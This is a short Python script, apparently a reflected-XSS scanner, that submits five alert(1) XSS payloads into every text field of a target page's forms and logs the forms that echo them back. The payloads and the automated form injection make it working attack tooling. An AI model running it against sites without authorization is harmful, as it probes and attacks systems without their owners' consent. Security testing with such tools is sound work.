import requests
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
from pprint import pformat
import sys
import os

# XSS payloads to try
xss_payloads = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "\"><svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>"
]

# Output file
RESULTS_FILE = "xss_results.txt"

def log_to_file(text):
    with open(RESULTS_FILE, "a", encoding="utf-8") as f:
        f.write(text + "\n")

def get_all_forms(url):
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    details = {
        "action": form.attrs.get("action", "").lower(),
        "method": form.attrs.get("method", "get").lower(),
        "inputs": []
    }
    for input_tag in form.find_all(["input", "textarea"]):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "")
        details["inputs"].append({"type": input_type, "name": input_name, "value": input_value})
    return details

def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input in form_details["inputs"]:
        input_name = input.get("name")
        input_type = input.get("type")
        if input_name:
            if input_type in ["text", "search", "textarea"]:
                data[input_name] = payload
            elif "value" in input:
                data[input_name] = input["value"]

    print(f"[+] Submitting to {target_url} with payload: {payload}")
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def scan_xss(url):
    if os.path.exists(RESULTS_FILE):
        os.remove(RESULTS_FILE)

    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}")
    log_to_file(f"[+] Scanning URL: {url}")
    log_to_file(f"[+] Detected {len(forms)} forms\n")

    found = False
    for form in forms:
        form_details = get_form_details(form)
        for payload in xss_payloads:
            res = submit_form(form_details, url, payload)
            if payload.lower() in res.text.lower():
                found = True
                result = (
                    f"\n⚠️ XSS Detected using payload: {payload}\n"
                    f"Form action: {form_details['action']}\n"
                    f"Form method: {form_details['method']}\n"
                    f"Inputs: {pformat(form_details['inputs'])}\n"
                )
                print(result)
                log_to_file(result)
    if not found:
        print("✅ No reflected XSS found.")
        log_to_file("✅ No reflected XSS found.")
    return found

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python xss_scanner.py http://target.com/page")
        sys.exit(1)

    url = sys.argv[1]
    scan_xss(url)
    print(f"\n📝 Results saved to {RESULTS_FILE}")
